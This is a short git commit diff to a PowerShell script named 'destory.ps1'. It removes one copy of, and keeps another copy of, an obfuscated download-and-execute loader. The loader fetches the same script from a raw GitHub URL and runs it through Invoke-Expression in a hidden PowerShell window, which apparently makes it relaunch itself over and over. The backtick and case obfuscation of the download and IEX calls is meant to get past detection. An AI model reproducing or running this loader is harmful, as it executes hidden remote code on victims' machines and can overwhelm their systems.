c3f4cd1c2693bbeb2c7f1ce88c6f868df8b1f412
43a1723 <hai1723notgay@gmail.com>
2025-04-10 13:03:19 +0700

    Update destory.ps1

--- s/destory.ps1
+++ s/destory.ps1
@@ -1,6 +1,4 @@
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
